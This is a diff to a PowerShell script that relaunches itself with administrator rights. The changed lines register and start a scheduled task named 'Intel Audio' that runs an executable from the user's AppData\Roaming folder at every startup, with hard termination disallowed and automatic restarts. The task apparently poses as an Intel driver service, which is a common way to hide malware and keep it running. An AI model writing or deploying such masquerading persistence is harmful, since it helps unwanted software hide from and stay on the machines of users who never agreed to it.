@@ -5,11 +5,15 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
             $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
             Start-Process powershell -Verb runas -ArgumentList $CommandLine
             Exit
-  }
+      }
 }
 
 $taskName = "Intel Audio"
-$taskTrigger = New-ScheduledTaskTrigger -AtLogOn -AsJob -RandomDelay -User "SYSTEM"
-$taskAction = New-ScheduledTaskAction -Execute '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio Service\Intel Audio.exe' -AsJob -WorkingDirectory '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio'
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5)
-Register-ScheduledTask -TaskName $taskName -Trigger $taskTrigger -Action $taskAction -RunLevel Highest -Force -User 'SYSTEM' -Settings $taskSettings -Force | Start-ScheduledTask=$true
+$taskPath = "\Intel\Audio"
+$trigger = New-ScheduledTaskTrigger -AtStartup 
+$action = New-ScheduledTaskAction -Execute '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio\Intel Audio.exe' -WorkingDirectory '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio'
+$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -Priority 2 -RestartCount 3 
+
+Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Settings $settings -AsJob 
+
+Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath
